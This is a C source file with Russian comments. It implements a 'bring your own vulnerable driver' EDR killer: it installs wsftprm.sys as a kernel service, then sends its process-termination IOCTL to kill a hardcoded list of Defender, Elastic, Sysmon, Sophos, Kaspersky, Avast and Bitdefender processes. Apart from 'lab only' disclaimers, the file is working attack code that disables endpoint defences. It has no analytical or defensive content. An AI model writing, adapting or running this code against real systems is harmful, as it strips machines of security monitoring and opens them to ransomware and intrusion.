/**
 * BYOVD EDR Killer - использует уязвимый драйвер wsftprm.sys
 * Обходит Microsoft Defender, Elastic EDR, Sysmon
 * 
 * Исходное исследование: 0xJs, Northwave, CETP
 * ТОЛЬКО ДЛЯ ЛАБОРАТОРНЫХ ИССЛЕДОВАНИЙ!
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winioctl.h>

#pragma comment(lib, "advapi32.lib")

// Структура для IOCTL вызова к уязвимому драйверу
typedef struct _KILL_BUFFER {
    DWORD dwPID;           // Process ID для завершения
    BYTE  bPadding[1032];  // Драйвер ожидает ровно 1036 байт
} KILL_BUFFER, *PKILL_BUFFER;

// Список процессов для завершения (EDR/AV)
const char* targets[] = {
    "MsMpEng.exe",      // Windows Defender
    "MsSense.exe",      // Defender for Endpoint
    "NisSrv.exe",       // Defender Network Protection
    "SenseCE.exe",      // Defender Advanced Threat Protection
    "ElasticEndpoint.exe",
    "ElasticAgent.exe",
    "Sysmon.exe",
    "Sysmon64.exe",
    "SophosED.exe",
    "SophosUI.exe",
    "Kaspersky.exe",
    "avp.exe",
    "AvastUI.exe",
    "AvastSvc.exe",
    "Bitdefender.exe",
    "bdservicehost.exe",
    NULL
};

// Получение PID по имени процесса
DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    DWORD pid = 0;
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// Загрузка уязвимого драйвера
BOOL LoadVulnerableDriver() {
    // Копируем драйвер в System32\Drivers
    char driverPath[MAX_PATH];
    GetSystemDirectoryA(driverPath, MAX_PATH);
    strcat(driverPath, "\\drivers\\wsftprm.sys");
    
    // Копируем встроенный драйвер (в реальном PoC драйвер внедряется)
    // Для демо: предполагаем, что wsftprm.sys уже находится в нужном месте
    
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return FALSE;
    
    // Создаем сервис драйвера
    SC_HANDLE hService = CreateServiceA(
        hSCM,
        "wsftprm",
        "wsftprm",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (!hService) {
        // Если уже существует, открываем
        hService = OpenServiceA(hSCM, "wsftprm", SERVICE_ALL_ACCESS);
        if (!hService) {
            CloseServiceHandle(hSCM);
            return FALSE;
        }
    }
    
    // Запускаем драйвер
    BOOL result = StartServiceA(hService, 0, NULL);
    if (!result && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return TRUE;
}

// Завершение процесса через уязвимый драйвер
BOOL KillProcessWithDriver(DWORD pid) {
    HANDLE hDevice = CreateFileA(
        "\\\\.\\Warsaw_PM",          // Symbolic link драйвера
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL
    );
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    KILL_BUFFER buffer = { 0 };
    buffer.dwPID = pid;
    
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        0x22201C,                    // IOCTL код для завершения процессов
        &buffer, sizeof(buffer),
        NULL, 0,
        &bytesReturned,
        NULL
    );
    
    CloseHandle(hDevice);
    return result;
}

// Главная функция BYOVD атаки
int BYOVD_KillEDR() {
    printf("[BYOVD] Loading vulnerable driver...\n");
    
    if (!LoadVulnerableDriver()) {
        printf("[!] Failed to load driver. Ensure wsftprm.sys exists.\n");
        return 1;
    }
    
    printf("[+] Driver loaded successfully\n");
    
    // Цикл уничтожения EDR процессов
    int index = 0;
    while (targets[index] != NULL) {
        const char* procName = targets[index];
        DWORD pid = GetProcessIdByName(procName);
        
        if (pid > 0) {
            printf("[*] Found %s (PID: %d), terminating...\n", procName, pid);
            
            if (KillProcessWithDriver(pid)) {
                printf("[+] Successfully terminated %s\n", procName);
            } else {
                printf("[!] Failed to terminate %s (error: %d)\n", procName, GetLastError());
            }
        }
        index++;
        
        // Небольшая задержка между попытками
        Sleep(500);
    }
    
    printf("[BYOVD] EDR processes terminated. Defenses disabled.\n");
    return 0;
}

int main() {
    printf("=== BYOVD EDR Killer (Educational Demo) ===\n");
    printf("[!] Requires wsftprm.sys in C:\\Windows\\System32\\drivers\\\n");
    printf("[!] Use only in isolated lab environment!\n\n");
    
    BYOVD_KillEDR();
    
    return 0;
}
